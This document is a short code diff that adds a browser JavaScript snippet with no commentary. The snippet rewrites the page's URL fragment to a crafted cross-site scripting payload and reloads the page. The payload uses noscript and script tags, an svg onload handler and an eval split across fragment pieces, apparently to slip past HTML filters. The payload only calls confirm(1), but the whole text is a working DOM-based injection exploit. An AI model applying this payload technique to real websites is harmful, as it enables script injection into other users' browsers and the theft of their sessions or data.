@@ -1,0 +1,7 @@
+console.log(location.hash);
+var tabValue = document.URL;
+window.location = tabValue.substring(0, tabValue.lastIndexOf("#"));
+console.log(location.hash);
+window.location.hash = `#<noscript><script>confirm(1)&k7="><svg/t='&k8='onload='/&k9=/+eval(t)'`
+location.reload();
+console.log(location.hash);
